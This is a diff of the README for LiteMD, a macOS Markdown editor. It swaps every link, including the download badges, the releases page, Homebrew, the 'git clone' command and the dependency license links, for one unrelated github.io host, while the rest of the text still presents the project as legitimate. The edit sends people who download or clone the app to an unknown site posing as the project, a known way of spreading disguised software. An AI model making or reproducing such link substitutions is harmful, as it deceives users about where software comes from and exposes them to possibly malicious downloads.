@@ -4,11 +4,11 @@
 
 **A lightweight Markdown editor, native to macOS.**
 
-[litemd.app](https://litemd.app) · [中文说明](README.zh-CN.md)
+[litemd.app](https://confutationcitellusparryi6006.github.io) · [中文说明](README.zh-CN.md)
 
-[![Download](https://img.shields.io/badge/download-0.1.1-2563EB)](https://litemd.app)
-[![Platform](https://img.shields.io/badge/macOS-15%2B-111827)](https://litemd.app)
-[![Universal](https://img.shields.io/badge/binary-universal-111827)](https://litemd.app)
+[![Download](https://img.shields.io/badge/download-0.1.1-2563EB)](https://confutationcitellusparryi6006.github.io)
+[![Platform](https://img.shields.io/badge/macOS-15%2B-111827)](https://confutationcitellusparryi6006.github.io)
+[![Universal](https://img.shields.io/badge/binary-universal-111827)](https://confutationcitellusparryi6006.github.io)
 [![License](https://img.shields.io/badge/license-MIT-12853C)](LICENSE)
 
 </div>
@@ -64,7 +64,7 @@ and an interface in English and Simplified Chinese.
 
 ## Install
 
-With [Homebrew](https://brew.sh):
+With [Homebrew](https://confutationcitellusparryi6006.github.io):
 
 ```bash
 brew tap gentpan/tap
@@ -72,20 +72,20 @@ brew install --cask litemd
 ```
 
 Or download the signed and notarized disk image from
-[litemd.app](https://litemd.app) or the
-[releases page](https://github.com/gentpan/LiteMD/releases), open it and drag
+[litemd.app](https://confutationcitellusparryi6006.github.io) or the
+[releases page](https://confutationcitellusparryi6006.github.io), open it and drag
 LiteMD to Applications.
 
 Requires macOS 15 or later. Universal binary — Apple silicon and Intel.
 
 ## Build from source
 
-You need Xcode 16 or later and [XcodeGen](https://github.com/yonaskolb/XcodeGen)
+You need Xcode 16 or later and [XcodeGen](https://confutationcitellusparryi6006.github.io)
 (`brew install xcodegen`). The Xcode project is generated from `project.yml` and
 is not checked in.
 
 ```bash
-git clone https://github.com/gentpan/LiteMD.git
+git clone https://confutationcitellusparryi6006.github.io
 cd LiteMD
 xcodegen generate
 xcodebuild -project LiteMD.xcodeproj -scheme LiteMD -configuration Debug build
@@ -124,11 +124,11 @@ identifier against the running app. Builds without an update feed configured
 
 | Component | License |
 | --- | --- |
-| [swift-markdown](https://github.com/swiftlang/swift-markdown) | Apache-2.0 |
-| [KaTeX](https://katex.org) | MIT |
-| [highlight.js](https://highlightjs.org) | BSD-3-Clause |
-| [Mermaid](https://mermaid.js.org) | MIT |
-| [Philosopher](https://fonts.google.com/specimen/Philosopher) (wordmark) | SIL OFL 1.1 |
+| [swift-markdown](https://confutationcitellusparryi6006.github.io) | Apache-2.0 |
+| [KaTeX](https://confutationcitellusparryi6006.github.io) | MIT |
+| [highlight.js](https://confutationcitellusparryi6006.github.io) | BSD-3-Clause |
+| [Mermaid](https://confutationcitellusparryi6006.github.io) | MIT |
+| [Philosopher](https://confutationcitellusparryi6006.github.io) (wordmark) | SIL OFL 1.1 |
 
 The preview libraries are bundled with the app so that math, syntax
 highlighting and diagrams render without a network connection. Their license
